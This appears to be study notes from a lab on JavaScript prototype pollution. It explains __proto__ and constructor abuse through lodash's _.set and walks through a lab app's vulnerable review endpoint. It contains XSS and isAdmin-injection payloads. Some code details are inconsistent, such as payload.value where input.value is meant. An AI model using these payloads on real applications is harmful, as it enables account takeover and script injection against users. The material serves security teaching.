
## Standard Approach
As we know, numerous properties are inherently present on the Object prototype in JavaScript. Among these, the `constructor` and `__proto__` properties stand out as particularly notable targets for exploitation by threat actors. The `constructor` property points to the function that constructs an object's prototype, while `__proto__` is a reference to the prototype object that the current object directly inherits from. Malicious actors often exploit these properties to manipulate an object's prototype chain, potentially leading to prototype pollution.

## Golden Rule
The concept hinges on an attacker’s ability to influence certain key parameters, such as `x` and `val`, in expressions akin to `Person[x][y] = val`. Suppose an attacker assigns `__proto__` to `x`. In that case, the attribute identified by `y` is universally set across all objects sharing the same class as the object with the value denoted by `val`.

In a more intricate scenario, when an attacker has control over `x`, `y`, and `val` in a structure like `Person[x][y][z] = val`, assigning `x` as `constructor` and `y` as `prototype` leads to a new property defined by `z` being established across all objects in the application with the assigned `val`. This latter approach necessitates a more complex arrangement of object properties, making it less prevalent in practice.

Before any updates are made, we have an initial friends array containing an object representing a friend’s profile. Each profile object includes properties such as id, name, reviews, and albums.

## Few Important Functions
When identifying potential prototype pollution vulnerabilities, penetration testers should focus on commonly used vectors/functions susceptible to prototype pollution. A thorough examination of how an application handles object manipulation is crucial. We will understand a few important functions that an attacker can exploit, and then we will practically perform the exploitation.

- **Property Definition by Path**: Functions that set object properties based on a given path (like `object[a][b][c] = value`) can be dangerous if the path components are controlled by user input. These functions should be inspected to ensure they don't inadvertently modify the object's prototype. Consider an endpoint that allows users to update reviews about any friend.

### **Initial Object Structure**
Before any updates are made, we have an initial friends array containing an object representing a friend's profile. Each profile object includes properties such as id, name, reviews, and albums.

```javascript
let friends = [ { id: 1, name: "testuser", age: 25, country: "UK", reviews: [], albums: [{ }], password: "xxx", } ]; 
_.set(friend, input.path, input.value);
```

### **Input Received from User**
The user wants to add a review for their friend. They provide a payload containing the path where the review should be added (**reviews.content**) and the review content `(<script>alert(anycontent)</script>)`.  

An attacker updates the path to target the prototype:
```javascript
{ "path": "reviews[0].content", "value": "&#60;script&#62;alert('anycontent')&#60;/script&#62;" };
```

We use the `_set` function from lodash to apply the payload and add the review content to the specified path within the friend's profile object.

### **Resulting Object Structure**
After executing the code, the friends array will be modified to include the user's review. However, due to a lack of proper input validation, the review content provided by the user `(<script>alert('anycontent')</script>)` was directly added to the profile object without proper sanitisation.

```javascript
let friends = [
  {
    id: 1,
    name: "testuser",
    age: 25,
    country: "UK",
    reviews: [
      "<script>alert('anycontent')</script>"
    ],
    albums: [{}],
    password: "xxx",
  }
];
```

Similarly, suppose the attacker wants to insert a malicious property into the friend's profile. In that case, they provide a payload containing the path where the property should be added (**isAdmin**) and the value for the malicious property (true).  

```javascript
const payload = { "path": "isAdmin", "value": true };
```

After executing the code, the `friends` array will be modified to include the malicious property **isAdmin** in the friend's profile object. The `friends` object will have the following structure:

```javascript
let friends = [
  {
    id: 1,
    name: "testuser",
    age: 25,
    country: "UK",
    reviews: [],
    albums: [],
    password: "xxx",
    isAdmin: true // Malicious property inserted by the attacker
  }
];
```

## Example
 Suppose you are working as a pentester in a firm tasked to pentest a social media application. You can access the application through the `10.10.35.197:5000` URL with the following login credentials:  

- Username: `bob`
- Password: `bob@123`

After logging in, you will see a dashboard like this:
	![](Pasted%20image%2020250125024803.png)

To identify prototype pollution, we will explore different functionalities of the social media app, like adding albums, sending friend requests, adding reviews, etc. Once you log in, other friends can be added to your friend list. Visit any friend's profile (let's say Sabalenka in this case). Once you visit the page, you will see different options like adding a review, cloning an album, etc. Let's explore the submit a review feature.
	![](Pasted%20image%2020250125024840.png)
The submit review feature allows users to submit any review, which will be saved in the database. Let's explore the client-side and server-side code to analyse various exploitation possibilities.

```html
    <form action="/submit-friend-review" method="post" class="mb-4">
        <h2 class="mb-3">Submit a Review</h2>
        <input type="hidden" name="friendId" value="1">
        <div class="form-group">
            <textarea class="form-control" name="reviewContent" placeholder="Write your review here"
                rows="3"></textarea>
        </div>
        <button type="submit" class="btn btn-primary">Submit Review</button>
    </form>
```

The client-side code takes the review as an input parameter and calls the API endpoint `/submit-friend-review` to add a review along with a hidden parameter `friendId`. As discussed in previous tasks, prototype pollution alone is rarely exploitable; however, once combined with other attack vectors like XSS, it can provide a better attack surface. Now, let's go through the server-side code.

```javascript
let friends = [
  {
    id: 1,
    name: "Sabalenka",
    age: 25,
    country: "UK",
    reviews: [],
    albums: [{ name: "USA Trip", photos: "git.thm" }],
    password: "xxx",
  },
...
...
app.post("/submit-friend-review", (req, res) => {
  if (!req.session.user) {
    return res.redirect("/signin");
  }
  const { friendId, reviewContent } = req.body;
  const friend = friends.find((f) => f.id === parseInt(friendId));
  if (!friend) {
    return res.status(404).send("Friend not found");
  }
  try {
    const input = JSON.parse(reviewContent);
    _.set(friend, input.path, payload.value);
  } catch (e) { }
  res.redirect(`/friend/${friendId}`);
});
```

- First, it validates the logged-in user's session; if not, it redirects it to the login page.
- Then, the code extracts the parameter and validates the connection between the signed-in user and the `friendId` received in the request parameters.
- After verifying the friend's connection, the code inserts the review in the friend's object.
- The code uses the `_.set` function in the Lodash utility that allows you to set the value of a property at a given path of an object. It's a convenient way to set values on objects deeply without having to check if each level of the path exists. If a portion of the path does not exist, `_set` will create it.  
- The code analysis shows this is a prime opportunity to perform the **property definition by path** attack.
- Moving forward, let's add a friend and visit his profile to add a simple review to see if it works.
	![](Pasted%20image%2020250125025340.png)
- The review is successfully added. Based on the knowledge we get from the source code review, let's prepare a payload for sending a review that will trigger an alert. We know that the friend's object has a `reviews` array where the reviews of each user are stored. The functionality to add a review works only on a friend's profile.
```javascript
{"path": "reviews[0].content", "value": "<script>alert('Hacked')</script>"}
```

Now, whenever someone visits the profile of this user, the XSS attack will be triggered. In such scenarios, the attacker can even manipulate other properties that may allow admin access to the user, like `isAdmin`, `isloggedIn` etc.